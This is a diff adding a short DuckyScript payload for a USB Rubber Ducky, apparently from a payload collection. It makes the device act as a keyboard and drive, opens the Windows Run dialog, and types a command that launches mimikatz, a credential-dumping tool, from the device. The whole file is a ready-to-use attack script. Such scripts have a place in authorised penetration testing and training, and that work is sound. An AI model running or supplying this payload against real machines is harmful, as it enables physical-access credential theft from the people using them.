@@ -1,0 +1,12 @@
+REM Runs executable stored on Rubber Ducky
+REM AUTHOR Crashwire
+REM DESCRIPTION: Utilizes cmd to run an executable stored on the D: Drive (Rubber Ducky). May require Admin privileges
+REM **CHANGE THE EXECUTABLE NAME**
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd /c "D: && mimikatz.exe"
+ENTER
+DELAY 200
+STRINGLN exit
